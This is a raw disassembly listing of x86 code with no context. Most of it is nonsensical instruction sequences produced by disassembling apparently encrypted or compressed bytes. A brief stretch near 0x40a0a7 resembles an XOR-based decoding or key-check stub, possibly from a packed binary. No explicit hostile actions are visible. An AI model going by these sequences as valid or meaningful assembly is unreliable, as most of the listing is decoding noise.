  409d01:	cmp    bh,BYTE PTR [edx-0x36]
  409d04:	pop    es
  409d05:	jb     0x409d46
  409d07:	dec    eax
  409d08:	sub    eax,0x8c6ac4
  409d0d:	xchg   cl,ah
  409d0f:	jecxz  0x409d1c
  409d11:	popf   
  409d12:	pop    esi
  409d13:	pop    esi
  409d14:	add    al,0xdf
  409d16:	sub    bh,BYTE PTR [ebp+0x31]
  409d19:	jno    0x409d40
  409d1b:	lods   al,BYTE PTR ds:[esi]
  409d1c:	mov    bl,0x66
  409d1e:	js     0x409d0a
  409d20:	clc    
  409d21:	imul   ecx,DWORD PTR [eax+0x86dfd95],0xfffffff5
  409d28:	mov    WORD PTR ds:0x1ff623f6,ss
  409d2e:	sti    
  409d2f:	and    ebx,DWORD PTR [ebp+0x5575289c]
  409d35:	in     al,0x3d
  409d37:	push   es
  409d38:	and    ah,BYTE PTR [ecx-0xf68e711]
  409d3e:	dec    eax
  409d3f:	stos   BYTE PTR es:[edi],al
  409d40:	gs xor eax,0x9f121307
  409d46:	retf   0x5520
  409d49:	ins    BYTE PTR es:[edi],dx
  409d4a:	cmp    ebx,ecx
  409d4c:	or     eax,0xdc4301dd
  409d51:	or     bh,BYTE PTR [eax]
  409d53:	jl     0x409d39
  409d55:	ins    DWORD PTR es:[edi],dx
  409d56:	dec    ebx
  409d57:	dec    ecx
  409d58:	enter  0x5774,0x69
  409d5c:	out    dx,eax
  409d5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d5e:	or     eax,DWORD PTR [edi+0x4724a251]
  409d64:	aaa    
  409d65:	fwait
  409d66:	xor    DWORD PTR [ecx+0x213e08a],edi
  409d6c:	call   0xc1cf:0xad3b64dc
  409d73:	cdq    
  409d74:	inc    ebx
  409d75:	push   ds
  409d76:	pop    eax
  409d77:	ja     0x409cfc
  409d79:	and    ecx,DWORD PTR ds:0xb1c95a7b
  409d7f:	dec    esi
  409d80:	push   eax
  409d81:	mov    ebx,0x18ec4f32
  409d86:	and    eax,0x7a42d533
  409d8b:	inc    eax
  409d8c:	add    ah,BYTE PTR [edx+0xf38bf0b]
  409d92:	ja     0x409e0c
  409d94:	push   esp
  409d95:	gs push esp
  409d97:	loopne 0x409d81
  409d99:	mov    DWORD PTR [ebp-0x74d9b7cd],edi
  409d9f:	fs hlt 
  409da1:	and    eax,0xe4064ea0
  409da6:	or     eax,edi
  409da8:	mov    eax,0xf7599ae3
  409dad:	mov    edx,0xabf897b0
  409db2:	pop    ecx
  409db3:	mov    edx,0xf1c9a790
  409db8:	in     eax,dx
  409db9:	fistp  DWORD PTR [ecx-0x2c]
  409dbc:	adc    eax,0x72026d08
  409dc1:	pop    ebx
  409dc2:	fcom   QWORD PTR [edi]
  409dc4:	retf   0xe97d
  409dc7:	ret    
  409dc8:	xor    esp,ebx
  409dca:	xor    DWORD PTR [ebx-0x555e68cb],esp
  409dd0:	aas    
  409dd1:	stos   BYTE PTR es:[edi],al
  409dd2:	mov    esp,0xf5875a52
  409dd7:	in     eax,0x11
  409dd9:	fnstsw WORD PTR [esi]
  409ddb:	mov    ebx,DWORD PTR [ebx]
  409ddd:	(bad)  
  409dde:	fbstp  TBYTE PTR [ebp-0x41b97d36]
  409de4:	scas   eax,DWORD PTR es:[edi]
  409de5:	sub    ecx,DWORD PTR [ebx]
  409de7:	pop    ss
  409de8:	fdivr  DWORD PTR [esi+0x760bf953]
  409dee:	cli    
  409def:	fs jbe 0x409d9f
  409df2:	sub    ebp,DWORD PTR [ecx]
  409df4:	xor    eax,0x5e97f606
  409df9:	addr16 xchg edi,eax
  409dfb:	fdiv   DWORD PTR [edx+edx*1-0x7c69a3f3]
  409e02:	enter  0xb6a0,0x2d
  409e06:	fcomp  DWORD PTR [ebp-0x5a]
  409e09:	imul   esi,DWORD PTR [ecx],0x2a
  409e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e0d:	jnp    0x409e5c
  409e0f:	mov    dl,0xbe
  409e11:	mov    WORD PTR [edi-0x822222f],gs
  409e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e18:	sbb    eax,0x6c203320
  409e1d:	mov    ch,ah
  409e1f:	ins    BYTE PTR es:[edi],dx
  409e20:	mov    ebp,0xaf0f5757
  409e25:	lods   eax,DWORD PTR ds:[esi]
  409e26:	not    BYTE PTR [ebx+ebp*4]
  409e29:	jge    0x409df9
  409e2b:	ins    DWORD PTR es:[edi],dx
  409e2c:	and    eax,0xdf2fd74
  409e31:	cwde   
  409e32:	mov    ds:0x72ed793c,eax
  409e37:	fcomp  QWORD PTR [eax-0x757ad6ee]
  409e3d:	mov    edx,0x3ebad420
  409e42:	div    DWORD PTR [esi-0x40]
  409e45:	and    bh,bl
  409e47:	mov    BYTE PTR [ebx-0x1c975e28],ch
  409e4d:	sbb    eax,0x937f03f5
  409e52:	xor    DWORD PTR [ebp-0x6a756366],ebp
  409e58:	cmp    al,0xd8
  409e5a:	xchg   ebp,eax
  409e5b:	inc    ecx
  409e5c:	xor    edx,ecx
  409e5e:	mov    ebx,0xbc3bcc51
  409e63:	push   0xffffffc2
  409e65:	pop    ecx
  409e66:	dec    ebx
  409e67:	push   es
  409e68:	inc    ebx
  409e69:	sub    eax,0xe627ce2f
  409e6e:	xor    edi,ebx
  409e70:	add    BYTE PTR [edi+0x77],ch
  409e73:	dec    esp
  409e74:	call   0x6797:0xab44146e
  409e7b:	das    
  409e7c:	test   BYTE PTR [ebp+0x213611b8],ch
  409e82:	rcl    BYTE PTR [ecx-0x52a04199],cl
  409e88:	scas   al,BYTE PTR es:[edi]
  409e89:	aas    
  409e8a:	mov    WORD PTR [edx+0x44318c9e],ds
  409e90:	test   eax,0x918c49ab
  409e95:	push   ecx
  409e96:	sahf   
  409e97:	jg     0x409f0d
  409e99:	aaa    
  409e9a:	and    edi,ebx
  409e9c:	sub    DWORD PTR ds:0x5443ccc2,edx
  409ea2:	into   
  409ea3:	clc    
  409ea4:	push   cs
  409ea5:	cmp    eax,0xdc9573b
  409eaa:	out    0xf0,al
  409eac:	push   esi
  409ead:	cs mov esi,0xdc59d0da
  409eb3:	push   eax
  409eb4:	fstp   TBYTE PTR [edx]
  409eb6:	mov    bh,0x24
  409eb8:	jbe    0x409f37
  409eba:	jno    0x409f32
  409ebc:	xchg   esi,eax
  409ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ebe:	js     0x409e76
  409ec0:	mov    esp,0x86cf46f4
  409ec5:	add    DWORD PTR [edi+esi*4],ecx
  409ec8:	and    esp,ecx
  409eca:	mov    bh,0xe8
  409ecc:	leave  
  409ecd:	shl    ah,1
  409ecf:	jmp    0x409ed9
  409ed1:	loop   0x409ee7
  409ed3:	pop    ebx
  409ed4:	test   eax,0x462a66ea
  409ed9:	cmp    al,0x4
  409edb:	xor    ah,BYTE PTR [eax+0x9]
  409ede:	stos   DWORD PTR es:[edi],eax
  409edf:	test   al,0x10
  409ee1:	out    0x6c,al
  409ee3:	add    BYTE PTR [ebp-0x57],dh
  409ee6:	dec    edi
  409ee7:	in     eax,0x33
  409ee9:	inc    ebx
  409eea:	mov    ds:0x118b5885,eax
  409eef:	ins    DWORD PTR es:[edi],dx
  409ef0:	std    
  409ef1:	mov    esi,0xa33bf417
  409ef6:	pusha  
  409ef7:	call   0xf5617433
  409efc:	or     esp,DWORD PTR [edi-0x45]
  409eff:	shl    BYTE PTR [eax+0x49],1
  409f02:	mov    al,ds:0x2615d333
  409f07:	je     0x409f2d
  409f09:	ds dec eax
  409f0b:	mov    ah,0x61
  409f0d:	cmc    
  409f0e:	lods   eax,DWORD PTR ds:[esi]
  409f0f:	mov    al,ds:0xa3e506ff
  409f14:	cmp    bl,BYTE PTR [ecx+eiz*8-0x8720e7e]
  409f1b:	mov    ?,WORD PTR [ecx+0x4f]
  409f1e:	call   0x6c9d:0x1a8dcda6
  409f25:	div    ebx
  409f27:	xor    al,0x49
  409f29:	test   al,0xab
  409f2b:	jns    0x409f98
  409f2d:	pop    ecx
  409f2e:	dec    ebx
  409f2f:	add    dh,dl
  409f31:	div    BYTE PTR [edi]
  409f33:	loope  0x409f23
  409f35:	sbb    BYTE PTR [ebp+edi*4-0xbb753f8],ch
  409f3c:	mov    ch,0x3a
  409f3e:	add    bh,dl
  409f40:	pop    eax
  409f41:	in     al,0xff
  409f43:	popf   
  409f44:	dec    eax
  409f45:	pusha  
  409f46:	into   
  409f47:	jmp    0x409fb0
  409f49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f4a:	sbb    bl,BYTE PTR ds:[esi]
  409f4d:	mov    bl,0xea
  409f4f:	je     0x409f42
  409f51:	fwait
  409f52:	outs   dx,DWORD PTR ds:[esi]
  409f53:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f55:	mov    ds:0xfd37244,eax
  409f5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f5b:	jb     0x409f78
  409f5d:	fsubr  st(1),st
  409f5f:	mov    bl,0x70
  409f61:	idiv   ah
  409f63:	pop    eax
  409f64:	(bad)  
  409f65:	scas   eax,DWORD PTR es:[edi]
  409f66:	loop   0x409f15
  409f68:	xchg   esp,eax
  409f69:	pop    ss
  409f6a:	pop    es
  409f6b:	xchg   DWORD PTR [esi],ebp
  409f6d:	aas    
  409f6e:	xor    BYTE PTR fs:[edi+0x12],cl
  409f72:	je     0x409f53
  409f74:	sub    al,0x10
  409f76:	pop    ss
  409f77:	cmc    
  409f78:	into   
  409f79:	push   ecx
  409f7a:	ffreep st(5)
  409f7c:	sti    
  409f7d:	mov    bh,cl
  409f7f:	outs   dx,BYTE PTR ds:[esi]
  409f80:	fnstsw WORD PTR ds:0x3ad85f73
  409f86:	and    BYTE PTR [ecx],bh
  409f88:	into   
  409f89:	jle    0x409f38
  409f8b:	push   es
  409f8c:	fdiv   DWORD PTR [ecx+0x322a5697]
  409f92:	lahf   
  409f93:	cld    
  409f94:	js     0x409f24
  409f96:	jg     0x409fcc
  409f98:	cwde   
  409f99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f9a:	mov    ebp,0xa4995ca2
  409f9f:	(bad)  
  409fa0:	aam    0x86
  409fa2:	loop   0x40a023
  409fa4:	nop
  409fa5:	dec    esi
  409fa6:	sub    BYTE PTR [eax+eiz*2],cl
  409fa9:	mov    ch,0xce
  409fab:	rdtsc  
  409fad:	es in  al,0xb0
  409fb0:	and    al,0x90
  409fb2:	xchg   ebp,eax
  409fb3:	xchg   ecx,eax
  409fb4:	xchg   DWORD PTR [esi-0x7d],eax
  409fb7:	(bad)  
  409fb8:	push   eax
  409fb9:	dec    eax
  409fba:	(bad)  
  409fbb:	sar    bl,1
  409fbd:	aaa    
  409fbe:	jnp    0x409fde
  409fc0:	dec    edi
  409fc1:	(bad)  
  409fc3:	loopne 0x409fd4
  409fc5:	dec    eax
  409fc6:	arpl   WORD PTR [esi-0x1c],cx
  409fc9:	inc    ebp
  409fca:	mov    edx,0xa3608d90
  409fcf:	and    al,0x2c
  409fd1:	jp     0x409fb3
  409fd3:	sbb    BYTE PTR [ebx+0x613ddb07],cl
  409fd9:	jecxz  0x40a005
  409fdb:	push   0x88d64cf3
  409fe0:	xchg   DWORD PTR [ecx+0x69],eax
  409fe3:	pop    es
  409fe4:	repnz stos DWORD PTR es:[edi],eax
  409fe6:	shl    eax,0x6a
  409fe9:	les    esp,FWORD PTR [ecx]
  409feb:	push   ebp
  409fec:	ins    BYTE PTR es:[edi],dx
  409fed:	mov    ch,0x2f
  409fef:	ret    0x2dd2
  409ff2:	xor    ch,BYTE PTR [edi+0x60]
  409ff5:	cmp    DWORD PTR [edi-0x61b3e532],0xffffffcc
  409ffc:	mov    ds:0x34af34f0,al
  40a001:	mov    eax,0x9d5fa86f
  40a006:	dec    ebp
  40a007:	jae    0x40a02a
  40a009:	in     al,dx
  40a00a:	add    eax,0xff79e137
  40a00f:	mov    DWORD PTR ds:0x38fd8870,ecx
  40a015:	push   ecx
  40a016:	xor    DWORD PTR [edi+0x5c],0xffffff94
  40a01a:	(bad)  
  40a01b:	daa    
  40a01c:	jge    0x40a076
  40a01e:	mov    ds:0xf3c9ad0f,al
  40a023:	popa   
  40a024:	jl     0x40a0a4
  40a026:	pop    esi
  40a027:	dec    edi
  40a028:	jns    0x40a08c
  40a02a:	ins    BYTE PTR es:[edi],dx
  40a02b:	test   al,0xf0
  40a02d:	sti    
  40a02e:	sbb    al,BYTE PTR [edx-0x7d127978]
  40a034:	js     0x40a011
  40a036:	test   BYTE PTR [esi-0x7a9e3518],ch
  40a03c:	inc    edi
  40a03d:	retf   0x7af7
  40a040:	int    0x62
  40a042:	data16 in al,dx
  40a044:	and    ah,BYTE PTR [ebx]
  40a046:	retf   0xd652
  40a049:	and    BYTE PTR ds:0x218c5603,0x41
  40a050:	jmp    0x4597:0x5c689a05
  40a057:	fdiv   st,st(7)
  40a059:	xchg   esp,eax
  40a05a:	int    0xde
  40a05c:	sbb    DWORD PTR [edx+0x3b],edx
  40a05f:	add    al,0x23
  40a061:	or     eax,DWORD PTR [ecx]
  40a063:	push   ebx
  40a064:	lods   eax,DWORD PTR ds:[esi]
  40a065:	(bad)  
  40a068:	add    ah,BYTE PTR [ecx]
  40a06a:	jno    0x40a02f
  40a06c:	(bad)  
  40a06d:	push   esp
  40a06e:	cmovs  esi,DWORD PTR [ecx+0x66]
  40a072:	push   ss
  40a073:	adc    DWORD PTR [edi+0x61],edx
  40a076:	adc    dl,BYTE PTR [edi]
  40a078:	and    BYTE PTR [ecx+ebx*1],0xef
  40a07c:	das    
  40a07d:	mov    ds:0x5c0b4fd5,eax
  40a082:	pop    ecx
  40a083:	dec    esp
  40a084:	jge    0x40a0ef
  40a086:	jno    0x40a0ae
  40a088:	(bad)  
  40a089:	mov    BYTE PTR [ebp+0x31d25560],al
  40a08f:	sbb    al,0xaf
  40a091:	pop    ebp
  40a092:	mov    bl,0x4c
  40a094:	mov    ecx,0xc6828cdf
  40a099:	cli    
  40a09a:	pop    ebp
  40a09b:	stos   DWORD PTR es:[edi],eax
  40a09c:	pop    ebx
  40a09d:	mov    ebp,0xde8ed2a3
  40a0a2:	pop    ebp
  40a0a3:	lods   eax,DWORD PTR ds:[esi]
  40a0a4:	mov    BYTE PTR [eax],0x45
  40a0a7:	rol    esi,0xf1
  40a0aa:	mov    edi,DWORD PTR [esi+0x4]
  40a0ad:	mov    edi,DWORD PTR [ebp+0x14]
  40a0b0:	xor    edx,edx
  40a0b2:	or     edx,DWORD PTR [ebp-0x70]
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	mov    esi,DWORD PTR [esi+0x65]
  40a12b:	mov    esp,0x18183352
  40a130:	sahf   
  40a131:	adc    bl,BYTE PTR [eax]
  40a133:	sbb    BYTE PTR [eax+0x45df3f62],bh
  40a139:	push   ss
  40a13a:	icebp  
  40a13b:	lods   eax,DWORD PTR ds:[esi]
  40a13c:	inc    edi
  40a13d:	jl     0x40a17b
  40a13f:	arpl   WORD PTR [ebx+ebp*4-0x864f373],ax
  40a146:	jecxz  0x40a162
  40a148:	sbb    edx,DWORD PTR [eax+0x4f175480]
  40a14e:	or     DWORD PTR [eax],esi
  40a150:	out    dx,eax
  40a151:	xchg   ecx,eax
  40a152:	sbb    al,0x64
  40a154:	ror    ch,1
  40a156:	scas   al,BYTE PTR es:[edi]
  40a157:	and    ebp,DWORD PTR [edi]
  40a159:	retf   
  40a15a:	neg    BYTE PTR [ebp+0x4239c28b]
  40a160:	int3   
  40a161:	mov    al,0x87
  40a163:	push   0xffffff98
  40a165:	std    
  40a166:	cmp    eax,0x70068ba2
  40a16b:	aad    0x6e
  40a16d:	mov    edi,0xf1db4ff8
  40a172:	inc    eax
  40a173:	xor    ah,cl
  40a175:	lods   eax,DWORD PTR ds:[esi]
  40a176:	push   edi
  40a177:	xchg   esi,eax
  40a178:	mov    cs,WORD PTR ds:0x42055611
  40a17e:	xor    al,0xe
  40a180:	jle    0x40a1b8
  40a182:	cld    
  40a183:	jae    0x40a182
  40a185:	pop    eax
  40a186:	cmp    dl,BYTE PTR [edx+esi*8-0x42e0593d]
  40a18d:	xchg   ebx,eax
  40a18e:	in     eax,dx
  40a18f:	test   BYTE PTR [eax+0x3239e09a],bl
  40a195:	pop    edi
  40a196:	adc    eax,0xd55b3831
  40a19b:	shl    BYTE PTR [ebx-0x3b1e8717],1
  40a1a1:	mov    eax,0x739def81
  40a1a6:	fisub  DWORD PTR [edx-0x1f5e6f69]
  40a1ac:	mov    WORD PTR [ebx],?
  40a1ae:	in     al,0x1d
  40a1b0:	loop   0x40a14d
  40a1b2:	scas   eax,DWORD PTR es:[edi]
  40a1b3:	xchg   esp,eax
  40a1b4:	xchg   esi,edi
  40a1b6:	cmp    BYTE PTR [edx+eax*8-0x2c],al
  40a1ba:	inc    esp
  40a1bb:	loopne 0x40a236
  40a1bd:	push   ss
  40a1be:	dec    edx
  40a1bf:	sbb    DWORD PTR [esi],ebp
  40a1c1:	adc    edx,DWORD PTR [esi]
  40a1c3:	icebp  
  40a1c4:	push   edx
  40a1c5:	pop    ss
  40a1c6:	sbb    eax,esi
  40a1c8:	push   edx
  40a1c9:	sub    bl,BYTE PTR ds:0xe43340b
  40a1cf:	out    dx,eax
  40a1d0:	aaa    
  40a1d1:	sbb    al,0xdd
  40a1d3:	jbe    0x40a1d8
  40a1d5:	xchg   ebx,eax
  40a1d6:	jb     0x40a16d
  40a1d8:	xchg   edi,eax
  40a1d9:	add    al,0xd7
  40a1db:	aaa    
  40a1dc:	dec    ecx
  40a1dd:	or     eax,0xf07d88ea
  40a1e2:	jmp    0x40a1ee
  40a1e4:	sbb    DWORD PTR [eax+0x61],ebp
  40a1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1e8:	stos   BYTE PTR es:[edi],al
  40a1e9:	mov    edi,0x261e0f02
  40a1ee:	cmp    edi,esp
  40a1f0:	sbb    DWORD PTR [esi*1+0x7abb2e43],edi
  40a1f7:	sbb    eax,0x30b011e4
  40a1fc:	xchg   edx,eax
  40a1fd:	xor    DWORD PTR [edx],eax
  40a1ff:	daa    
  40a200:	adc    ebx,DWORD PTR [ebp+0x2369ec54]
  40a206:	push   edi
  40a207:	jecxz  0x40a209
  40a209:	sar    DWORD PTR [esi+0x33f048d3],1
  40a20f:	je     0x40a1f4
  40a211:	add    al,0x39
  40a213:	test   DWORD PTR [esi+0x112b79d6],edx
  40a219:	rol    BYTE PTR [edi+0x4b3eaf03],1
  40a21f:	seta   BYTE PTR [ecx+0x14]
  40a223:	popf   
  40a224:	cmp    ebx,eax
  40a226:	gs xchg edx,eax
  40a228:	enter  0x9251,0xa7
  40a22c:	xchg   edx,eax
  40a22d:	js     0x40a1cd
  40a22f:	hlt    
  40a230:	test   eax,0x7a2dbde9
  40a235:	retf   
  40a236:	bound  edx,QWORD PTR ds:0x1be6ce04
  40a23c:	sub    dh,BYTE PTR [eax-0x71]
  40a23f:	mov    edi,0x5dc07550
  40a244:	ins    DWORD PTR es:[edi],dx
  40a245:	adc    al,0x35
  40a247:	leave  
  40a248:	nop
  40a249:	bound  eax,QWORD PTR [ebx-0x5b]
  40a24c:	rcl    BYTE PTR [edi],cl
  40a24e:	jge    0x40a2b3
  40a250:	mov    ah,0xac
  40a252:	push   ebx
  40a253:	inc    esi
  40a254:	xor    al,0xdf
  40a256:	fstp   DWORD PTR [ecx+0x4b]
  40a259:	stc    
  40a25a:	xchg   esi,eax
  40a25b:	and    eax,0xf44fcf5f
  40a260:	mov    ah,0xde
  40a262:	cmp    al,BYTE PTR [eax-0x38]
  40a265:	inc    esi
  40a266:	mov    bh,0xff
  40a268:	xchg   ecx,eax
  40a269:	cmc    
  40a26a:	cmp    al,BYTE PTR [eax+0x4b]
  40a26d:	ret    
  40a26e:	int    0x21
  40a270:	cmp    eax,0x8f309b11
  40a275:	dec    eax
  40a276:	lds    edi,FWORD PTR [ebx+0x76883798]
  40a27c:	into   
  40a27d:	dec    esi
  40a27e:	adc    ch,BYTE PTR [edx+eiz*8]
  40a281:	test   BYTE PTR [eax+0x7fde5159],bh
  40a287:	xchg   DWORD PTR [ebp+0x47],edx
  40a28a:	nop
  40a28b:	sub    eax,0x46f6350d
  40a290:	ins    DWORD PTR es:[edi],dx
  40a291:	(bad)  
  40a292:	addr16 in eax,dx
  40a294:	cld    
  40a295:	jb     0x40a21c
  40a297:	xor    BYTE PTR [ebx-0x1c1f3d43],0xb4
  40a29e:	jge    0x40a29d
  40a2a0:	aam    0xb0
  40a2a2:	xchg   edx,eax
  40a2a3:	popf   
  40a2a4:	mov    ds:0x14cfce39,eax
  40a2a9:	fsub   st(7),st
  40a2ab:	inc    esp
  40a2ac:	fst    QWORD PTR [edi]
  40a2ae:	lds    edx,FWORD PTR [esi-0x2e1cfc31]
  40a2b4:	inc    ebp
  40a2b5:	mov    ds:0x179c8f37,al
  40a2ba:	fbld   TBYTE PTR [eax-0x26]
  40a2bd:	push   ebp
  40a2be:	cmp    edx,DWORD PTR [ebp+ebx*8+0x4]
  40a2c2:	jmp    0x395a8746
  40a2c7:	scas   al,BYTE PTR es:[edi]
  40a2c8:	inc    ebx
  40a2c9:	sbb    dh,dh
  40a2cb:	sub    BYTE PTR [esi+0x74d9ae6],ch
  40a2d1:	popf   
  40a2d2:	call   0x7550:0x6c15da89
  40a2d9:	mov    edi,0xaeb6831b
  40a2de:	ds jb  0x40a32c
  40a2e1:	or     DWORD PTR [eax+0x66b3b249],ecx
  40a2e7:	cmp    dl,0x8a
  40a2ea:	xchg   esp,eax
  40a2eb:	repnz clc 
  40a2ed:	aaa    
  40a2ee:	popf   
  40a2ef:	cmc    
  40a2f0:	cli    
  40a2f1:	mov    bh,0xa7
  40a2f3:	add    eax,0x3cb5ff95
  40a2f8:	sbb    eax,0x164ff946
  40a2fd:	or     eax,0xb437e223
  40a302:	fmul   DWORD PTR [edx+0x731445fe]
  40a308:	push   0x40
  40a30a:	push   ebp
  40a30b:	call   0x9b8c918f
  40a310:	je     0x40a336
  40a312:	inc    edi
  40a313:	push   edi
  40a314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a315:	or     BYTE PTR [esi],ch
  40a317:	inc    ebx
  40a318:	cld    
  40a319:	scas   eax,DWORD PTR es:[edi]
  40a31a:	sub    cl,BYTE PTR [esi-0xfd8b0dd]
  40a320:	cmp    edx,DWORD PTR [ecx-0x3141ec1f]
  40a326:	sbb    al,0xf4
  40a328:	push   eax
  40a329:	pop    esp
  40a32a:	jmp    0x4058:0xfeac2463
  40a331:	and    al,al
  40a333:	cli    
  40a334:	sub    DWORD PTR ds:0xfd078839,edx
  40a33a:	inc    esp
  40a33b:	dec    al
  40a33d:	inc    ebp
  40a33e:	pop    ds
  40a33f:	mov    ds:0xb60f1faf,eax
  40a344:	mov    ah,0xba
  40a346:	mov    ah,BYTE PTR [ecx+0x3cb24a5c]
  40a34c:	int3   
  40a34d:	mov    cl,0xf2
  40a34f:	test   ebp,0x6ae7450a
  40a355:	rcl    BYTE PTR [esi-0x75e95905],1
  40a35b:	pop    edx
  40a35c:	or     BYTE PTR [esi-0x57],dl
  40a35f:	ror    edx,cl
  40a361:	dec    edx
  40a362:	mov    cr1,edx
  40a365:	jp     0x40a2f8
  40a367:	push   0xffffff97
  40a369:	adc    al,0x31
  40a36b:	sbb    BYTE PTR [esi+0x683d5e99],0x87
  40a372:	adc    cl,BYTE PTR [ebp-0xf]
  40a375:	or     DWORD PTR [eax+eax*4],edi
  40a378:	add    esi,DWORD PTR [eax-0x2e]
  40a37b:	lods   eax,DWORD PTR ds:[esi]
  40a37c:	fst    DWORD PTR [eax+0x69c7240f]
  40a382:	xchg   esp,eax
  40a383:	div    DWORD PTR [edx+eax*8-0x30]
  40a387:	add    al,0xff
  40a389:	fisttp WORD PTR [edx+0x78ad5f7a]
  40a38f:	cmp    edi,DWORD PTR [ebx]
  40a391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a392:	add    dh,BYTE PTR ds:0x69da
  40a397:	(bad)  
  40a398:	inc    BYTE PTR [edx+ebp*8+0x3]
  40a39c:	(bad)  [edi+0xb]
  40a39f:	test   BYTE PTR ds:0x8f5f3f5c,al
  40a3a5:	fst    QWORD PTR [ebx+0x4087ece7]
  40a3ab:	xchg   ebx,eax
  40a3ac:	retf   0x7c08
  40a3af:	cmp    bh,bl
  40a3b1:	and    cl,BYTE PTR [ebp+0xaa6f3e1]
  40a3b7:	sub    eax,0xfe0e38d9
  40a3bc:	mov    edx,edx
  40a3be:	mov    ebp,0xc40deedc
  40a3c3:	push   ebx
  40a3c4:	jmp    0x55513b04
  40a3c9:	daa    
  40a3ca:	inc    edi
  40a3cb:	in     eax,0xdf
  40a3cd:	jecxz  0x40a3e1
  40a3cf:	mov    dh,0xe8
  40a3d1:	dec    esp
  40a3d2:	nop
  40a3d3:	mov    bl,BYTE PTR [ebx+edi*4-0x2b7d8256]
  40a3da:	fist   DWORD PTR [esi+0x56a6f555]
  40a3e0:	sti    
  40a3e1:	outs   dx,BYTE PTR ds:[esi]
  40a3e2:	mov    ds:0x1e63e01d,al
  40a3e7:	or     eax,0xced990f6
  40a3ec:	test   eax,0x9b9b2e0c
  40a3f1:	imul   ebx,DWORD PTR [edi-0x26b07ee8],0x774c0ec0
  40a3fb:	fucomi st,st(2)
  40a3fd:	mov    edi,0x569d1eb7
  40a402:	dec    esp
  40a403:	in     al,0x1b
  40a405:	sar    DWORD PTR ds:0x33dc64e2,1
  40a40b:	daa    
  40a40c:	sahf   
  40a40d:	mov    dh,0xaa
  40a40f:	mov    dl,0xbc
  40a411:	ins    DWORD PTR es:[edi],dx
  40a412:	jnp    0x40a476
  40a414:	push   esp
  40a415:	stos   DWORD PTR es:[edi],eax
  40a416:	adc    al,0xb0
  40a418:	mov    gs,WORD PTR [esi+0x45c89bcc]
  40a41e:	xor    eax,DWORD PTR [eax+ebx*1+0x5e]
  40a422:	jae    0x40a408
  40a424:	adc    al,0x19
  40a426:	mov    edx,0x274a3d59
  40a42b:	inc    ecx
  40a42c:	fcom   st(3)
  40a42e:	or     eax,0x28b3c8a6
  40a433:	xchg   ecx,eax
  40a434:	push   0x52bd75a4
  40a439:	mov    edx,0x721540ae
  40a43e:	loope  0x40a461
  40a440:	or     eax,0xf1380a4b
  40a445:	push   0xffffffae
  40a447:	data16 loop 0x40a456
  40a44a:	out    0xed,al
  40a44c:	adc    BYTE PTR [edi-0x7c],ch
  40a44f:	jbe    0x40a44b
  40a451:	jb     0x40a3ea
  40a453:	inc    esi
  40a454:	fidivr WORD PTR [eax]
  40a456:	popf   
  40a457:	dec    eax
  40a458:	mov    edi,DWORD PTR [eax-0x5878d0d5]
  40a45e:	xchg   DWORD PTR [ecx+0x705c00c7],edi
  40a464:	cdq    
  40a465:	lods   eax,DWORD PTR ds:[esi]
  40a466:	cs mov ebx,0x8de2efe2
  40a46c:	jle    0x40a450
  40a46e:	sub    al,0x26
  40a470:	mov    eax,fs:0x174fcc55
  40a476:	adc    DWORD PTR [edi-0x4e],eax
  40a479:	outs   dx,DWORD PTR ds:[esi]
  40a47a:	loope  0x40a4c0
  40a47c:	call   0xd1ec:0xa0e76b74
  40a483:	adc    al,0x94
  40a485:	jecxz  0x40a4a4
  40a487:	sbb    bh,BYTE PTR [edx-0xa473fa7]
  40a48d:	pop    ds
  40a48e:	scas   al,BYTE PTR es:[edi]
  40a48f:	mov    edx,0x7d267161
  40a494:	inc    edx
  40a495:	sar    DWORD PTR [esi],0x9f
  40a498:	in     eax,0xe8
  40a49a:	retf   
  40a49b:	(bad)  
  40a49c:	std    
  40a49d:	mov    DWORD PTR [edx-0x78def2d9],esp
  40a4a3:	scas   al,BYTE PTR es:[edi]
  40a4a4:	outs   dx,BYTE PTR ds:[esi]
  40a4a5:	mov    esi,0x1722cf4c
  40a4aa:	jbe    0x40a4cd
